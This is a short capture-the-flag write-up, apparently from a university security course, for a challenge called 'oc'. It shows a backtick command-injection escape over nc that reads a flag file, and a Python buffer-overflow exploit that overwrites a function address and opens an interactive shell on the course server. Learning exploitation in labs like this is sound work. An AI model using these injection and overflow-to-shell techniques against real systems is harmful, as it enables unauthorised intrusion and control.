# Write up: oc (1-3)

## ymli (0016045)


### nc to it, try to escape from the argument setting script

```sh
nc secprog.cs.nctu.edu.tw 10002
`sh`
cat /home/oc/flag 1>&2
```

#### fixed by ddaa


### read the assembly code, decompile that with IDA and snowman

- try find an overflow?
- memcpy
![Imgur](http://i.imgur.com/0vPoy8b.png)

### the behavior of the program

1. read the arguments
2. need 7 args
3. jump to the strange function (?)
4. anti-debugger features (don't worry just use gdb and bypass the ptrace check)
5. memcpy an address of a function call
6. the last arg can be used to overflow that

### write the exploit script [0]

- connect to the server
- overflow the function call address to the line that invokes a shell (0x08048731)
- send the payload via the 7th argument

## Appendix

### [0] expolit.py

```python
#!/usr/bin/env python

import struct
from socket import *
import telnetlib

ip = 'secprog.cs.nctu.edu.tw'
port = 10002

soc = socket(AF_INET, SOCK_STREAM)
soc.connect((ip,port))
data = soc.recv(1024)
print(data.decode())

payload = b"a a a a a a bbbbbbbbbbbbbbbb\x31\x87\x04\x08\n"
soc.send(payload)

# get interactive shell
t = telnetlib.Telnet()
t.sock = soc
t.interact()
```
